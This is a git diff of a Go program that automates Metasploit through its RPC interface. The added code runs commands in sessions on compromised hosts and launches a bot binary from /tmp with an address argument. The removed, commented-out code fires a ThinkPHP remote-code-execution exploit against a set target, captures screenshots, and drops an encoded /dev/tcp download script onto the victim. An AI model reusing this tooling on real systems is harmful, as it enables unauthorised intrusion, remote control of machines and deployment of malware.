@@ -4,6 +4,9 @@ import (
 	"encoding/json"
 	"fmt"
 	"github.com/iami317/gomsf"
+	"github.com/iami317/gomsf/rpc"
+	"strings"
+	"time"
 )
 
 type ExpInfo struct {
@@ -25,7 +28,7 @@ func (ei ExpInfo) String() string {
 }
 
 func main() {
-	client, err := gomsf.New("192.168.110.24:55553")
+	client, err := gomsf.New("127.0.0.1:55553")
 	if err != nil {
 		panic(err)
 	}
@@ -34,174 +37,157 @@ func main() {
 		panic(err)
 	}
 	defer client.Logout()
-	client.Session.Write(7, "shell")
-	client.Session.Write(7, "whoami")
-	fmt.Println(client.Session.Read(7))
-	//time.Sleep(time.Second)
-	//client.Session.Write(7, "uname -a")
-	//fmt.Println(client.Session.Read(7))
-	fmt.Println(client.Session.SessionKill(7))
-	client.Session.Write(7, "sysinfo")
-	fmt.Println(client.Session.Read(7))
-	//sessionList, _ := client.Session.List()
-	//bb, _ := json.Marshal(sessionList)
-	//fmt.Println(string(bb))
-
-	//cd
-	//pwd
-	//cat /tmp/BSmLMQor
-	//getuid
-	//sysinfo
-	//search -d / -f *.txt
-	//upload /tmp/aaa.txt /tmp
-	//err = client.Session.Write(7, `execute -f /usr/bin/curl "--version"`)
-	//err = client.Session.Write(7, `chmod 777 /tmp/bot_linux_x86_64`)
-	//err = client.Session.Write(7, `execute -f echo  -a "11111111111 >> /tmp/aaa.txt"`)
-	//fmt.Println(client.Session.Write(7, `ls /etc/`))
-	//fmt.Println(client.Session.Read(7))
-	//fmt.Println(client.Session.SessionDetach(7))
-
-	//err = client.Session.ShellWrite(7, `whoami\n`)
-	//err = client.Session.Write(7, `uname -a`)
-	//err = client.Session.Write(7, `echo "hello" >> /tmp/hello.txt`)
-	//if err != nil {
-	//	fmt.Println("命令执行失败")
-	//	return
-	//}
-	//client.Session.ShellWrite(7, "pwd")
-
-	//time.Sleep(time.Second * 2)
-	//s2, err2 := client.Session.ShellRead(7, 0)
-	//fmt.Println("s2=>", s2, "err2=>", err2)
-	//data, _ := base64.StdEncoding.DecodeString("IyEvYmluL2Jhc2gKCmZ1bmN0aW9uIF9fY3VybCgpIHsKICByZWFkIHByb3RvIHNlcnZlciBwYXRoIDw8PCQoZWNobyAkezEvLy8vIH0pCiAgRE9DPS8ke3BhdGgvLyAvL30KICBIT1NUPSR7c2VydmVyLy86Kn0KICBQT1JUPSR7c2VydmVyLy8qOn0KICBbWyB4IiR7SE9TVH0iID09IHgiJHtQT1JUfSIgXV0gJiYgUE9SVD04MAoKICBleGVjIDM8Pi9kZXYvdGNwLyR7SE9TVH0vJFBPUlQKICBlY2hvIC1lbiAiR0VUICR7RE9DfSBIVFRQLzEuMFxcclxcbkhvc3Q6ICR7SE9TVH1cXHJcXG5cXHJcXG4iID4mMwogIHJycj1gZWNobyAiRFFvPSIgfCBiYXNlNjQgLWRgCiAgKHdoaWxlIHJlYWQgbGluZTsgZG8KICAgW1sgIiRsaW5lIiA9PSAkcnJyIF1dICYmIGJyZWFrCiAgZG9uZSAmJiBjYXQpIDwmMwogIGV4ZWMgMz4mLQp9CgpfX2N1cmwgJDE=")
-	//Rea := strings.NewReader(string(data))
-	//br := bufio.NewReader(Rea)
-	//for {
-	//	l, _, e := br.ReadLine()
-	//	if e == io.EOF {
+	//defer client.Session.SessionKill(3)
+	sessionList, _ := client.Session.List()
+	bb, _ := json.Marshal(sessionList)
+	fmt.Println(string(bb))
+	//client.Session.Write(3, "shell")
+	//time.Sleep(time.Second * 5)
+	//client.Session.Write(3, `whoami`)
+	//time.Sleep(time.Second * 1)
+	//str, err := client.Session.Read(3)
+	//fmt.Println("str=>", str, "err=>", err)
+	//str, err := ExecuteCommand(client, 3, "uname -a")
+	//fmt.Println(str, err)
+	//client.Session.Write(3, "execute -h")
+	//fmt.Println(client.Session.Read(3))
+	//return
+	//for i := 0; i < 10; i++ {
+	//	str, _ := client.Session.Read(3)
+	//	fmt.Println("********", str)
+	//	if strings.Contains(str, "Channel") && strings.Contains(str, "created.") {
+	//		client.Session.Read(3)
 	//		break
 	//	}
-	//	if strings.Contains(string(l), "\"") {
-	//		fmt.Println(string(l))
-	//		_ = client.Session.Write(7, fmt.Sprintf(`echo "%v" >> /tmp/curl.sh`, string(l)))
-	//	} else {
-	//		fmt.Println(string(l))
-	//		_ = client.Session.Write(7, fmt.Sprintf(`echo "%v" >> /tmp/curl.sh`, string(l)))
+	//	if strings.Contains(str, "shell: not found") {
+	//		client.Session.Read(3)
+	//		break
 	//	}
 	//}
-
-	//if err = client.HealthCheck(); err != nil {
-	//	panic(err)
-	//}
-
-	//version, err := client.Core.Version()
-	//exploits, err := client.Module.Exploits()
-	//for _, exploit := range exploits {
-	//	fmt.Println(exploit)
-	//	continue
-	//	expInfo := ExpInfo{}
-	//	if len(exploit) > 0 {
-	//		moduleInfo, err := client.Module.Info(gomsf.ExploitType, exploit)
-	//		if err != nil {
-	//			fmt.Println(err)
-	//			continue
-	//		}
-	//		expInfo.Name = moduleInfo.Name
-	//		//expInfo.Tags =
-	//		expInfo.ExecMethod = 2
-	//		expInfo.Rank = moduleInfo.Rank
-	//		if len(moduleInfo.Platform) > 0 {
-	//			for _, s := range moduleInfo.Platform {
-	//				sss := strings.Split(s, "::")
-	//				expInfo.PlatForm = append(expInfo.PlatForm, strings.ToLower(sss[len(sss)-1]))
-	//			}
-	//		}
-	//		if len(moduleInfo.References) > 0 {
-	//			for _, reference := range moduleInfo.References {
-	//				if len(reference) >= 2 && strings.Contains(reference[0], "CVE") {
-	//					expInfo.VulCode = append(expInfo.VulCode, fmt.Sprintf("%v-%v", reference[0], reference[1]))
-	//				}
-	//			}
-	//		}
-	//		if len(moduleInfo.FilePath) > 0 {
-	//			chunks := strings.Split(moduleInfo.FilePath, "/")
-	//			//fmt.Println("-------", chunks)
-	//			if len(chunks) >= 10 {
-	//				//ss := strings.Split(strings.TrimLeft(chunks[9], ".rb"), "_")
-	//				//ss := strings.TrimLeft(chunks[9], ".rb")
-	//				expInfo.Tags = append(expInfo.Tags, chunks[7])
-	//				expInfo.Tags = append(expInfo.Tags, chunks[8])
-	//				//expInfo.Tags = append(expInfo.Tags, ss)
-	//			}
-	//		}
-	//		//fmt.Println(moduleInfo.String())
-	//		fmt.Println(expInfo.String())
-	//		time.Sleep(time.Millisecond * 10)
-	//	}
-	//}
-	//fmt.Println(len(exploits))
-	//architectures, err := client.Module.Architectures()
-	//platforms, err := client.Module.Platforms()
-	//payloads, err := client.Module.Payloads()
-	//posts, err := client.Module.Posts()
-	//auxiliaries, err := client.Module.Auxiliaries()
-	//nops, err := client.Module.Nops()
-	//evasions, err := client.Module.Evasions()
-	//moduleInfo, err := client.Module.Info(gomsf.PayloadType, "windows/meterpreter/reverse_tcp")
-	//encoded, err := client.Module.Encode("AAAA", "x86/shikata_ga_nai", &gomsf.EncodeOptions{
-	//	Format: "c",
-	//})
-	//pluginList, _ := client.Plugins.List()
-	//fmt.Println(pluginList)
-	//exploit, err := client.Module.UseExploit("unix/webapp/thinkphp_rce")
-	//err = exploit.Set("RHOSTS", "192.168.100.149")
-	//if err != nil {
-	//	fmt.Println(err)
-	//}
-	//exploit.Set("RPORT", "8081")
-	//exploit.Set("TARGETURI", "/")
-	//exploit.Set("SRVHOST", "0.0.0.0")
-	//exploit.Set("SRVPORT", "8080")
-	//exploit.Set("LHOST", "192.168.0.199")
-	//exploit.Set("LPORT", "4444")
-	//options := exploit.OptionsAdvanced()
-	//detail := exploit.OptionsDetail()
-	//fmt.Println(exploit.Get("RHOSTS"))
+	//fmt.Println("--------shell created.")
+	//client.Session.Write(3, "uname -a")
+	//fmt.Println(client.Session.Read(3))
+	//defer func() {
+	//	_, _ = client.Session.SessionKill(3)
+	//	fmt.Println("SessionKill")
+	//}()
+	//fmt.Println(client.Session.RunSingle(3, "sysinfo"))
+	//time.Sleep(time.Second * 2)
+	//fmt.Println(client.Session.Read(3))
+	//return
 	/*
-			res, err := client.Module.Execute(gomsf.ExploitType, "unix/webapp/thinkphp_rce", map[string]interface{}{
-				"RHOST":   "192.168.100.149",
-				"RPORT":   "8081",
-				"SRVHOST": "0.0.0.0",
-				"SRVPORT": "8080",
-				"LHOST":   "192.168.110.33",
-				"LPORT":   "4444",
-			})
-			fmt.Println(res, err)
-			if res.JobID > 0 && len(res.UUID) > 0 {
-				jobId := strconv.Itoa(int(res.JobID))
-				jobRes, _ := client.Jobs.Info(jobId)
-				fmt.Println(res.JobID, res.UUID)
-				fmt.Println("jobRes", jobRes)
-			} else {
-				fmt.Println("攻击失败")
-				return
-			}
-			//
-
-
-		//list, _ := client.Session.List()
-		//fmt.Println(list)
-		//return
-
-		err = client.Session.Write(7, "screenshot")
-		fmt.Println(err)
-		time.Sleep(time.Second * 1)
-		s, err := client.Session.Read(7)
-		fmt.Println(s)
-		fmt.Println(err)
+		client.Session.SessionKill(3)
 	*/
-	//fmt.Println(client.Session.Stop(5))
-	//fmt.Println(client.Session.Stop(6))
-	//list, _ := client.Session.List()
-	//fmt.Println(list)
+	fmt.Println(client.Session.RunSingle(4, `execute -f /tmp/bot_linux_x86_64 -a "-sh 192.168.100.145 -av 11111111 -tid 145"`))
+	time.Sleep(time.Second * 5)
+	fmt.Println(client.Session.Read(4))
+	return
+
+	str, err := command(client, 4, "shell", "\n")
+	if strings.Contains(str, `created.`) || strings.Contains(str, "shell: not found") {
+		defer client.Session.SessionKill(4)
+		fmt.Println("shell 创建成功")
+	} else {
+		fmt.Println("shell 创建失败", str, err)
+		return
+	}
+
+	str, err = command(client, 4, "sysinfo", "\n")
+	fmt.Println(err)
+	fmt.Printf("%#v", str)
+	return
+
+}
+
+func command(client *gomsf.Client, sid int, cmd string, endStrs string) (string, error) {
+	err := client.Session.Write(sid, cmd)
+	//fmt.Println(sid, cmd, err)
+	if err != nil {
+		return "", err
+	}
+	timeout := 20
+	counter := 1
+	out := ""
+	for range time.Tick(time.Second) {
+		if counter >= timeout {
+			return "", fmt.Errorf("命令执行超时")
+		}
+		outStr, _ := client.Session.Read(sid)
+		out += outStr
+		fmt.Printf("-----%#v => %v\n", out, counter)
+		if strings.Contains(out, "Unknown command") {
+			return out, fmt.Errorf("命令执行失败")
+		}
+
+		if len(endStrs) == 0 {
+			//fmt.Println("****")
+			if len(out) > 0 {
+				return out, nil
+			}
+		} else {
+			if strings.Contains(outStr, endStrs) {
+				return strings.TrimRight(out, "\n"), nil
+			}
+		}
+		counter += 1
+	}
+	return "", fmt.Errorf("命令执行超时.")
+}
+
+func ExecuteCommand(client *gomsf.Client, sessionId uint32, command string) (string, error) {
+	for range time.Tick(400 * time.Millisecond) {
+		_ = client.Session.Write(int(sessionId), command)
+		str, _ := client.Session.Read(int(sessionId))
+		if len(str) > 0 {
+			//fmt.Println("*******", str)
+			if strings.Contains(str, "Unknown command") {
+				_ = client.Session.Write(int(sessionId), "shell")
+			} else if strings.Contains(str, "shell: not found") {
+				splits := strings.Split(str, "\n")
+				var s string
+				for _, split := range splits {
+					//fmt.Println("*******", split)
+					if !strings.Contains(split, "shell: not found") {
+						s += fmt.Sprintf("%v\n", split)
+					}
+				}
+				return strings.TrimRight(s, "\n"), nil
+			} else {
+				return str, nil
+			}
+		}
+	}
+	return "", nil
+}
+
+func getSessionInfo(exploitUuid string, sessionList rpc.SessionListRes) (sid uint32, os string, arch string, authority string) {
+	for sessionId, data := range sessionList {
+		if data.ExploitUUID == exploitUuid {
+			sid = sessionId
+			if len(data.Platform) > 0 && len(data.Arch) > 0 {
+				if data.Platform == "linux" || data.Platform == "unix" {
+					os = "Linux"
+				} else if data.Platform == "windows" {
+					os = "Windows"
+				}
+
+				if data.Arch == "x64" {
+					arch = "x86_64"
+				} else {
+					arch = "arm64"
+				}
+			} else {
+				os = "Linux"
+				arch = "x86_64"
+			}
+
+			if len(data.Info) > 0 {
+				infos := strings.Split(data.Info, "@")
+				authority = strings.Trim(infos[0], " ")
+			}
+
+			return sessionId, os, arch, authority
+		}
+	}
+	return
 }
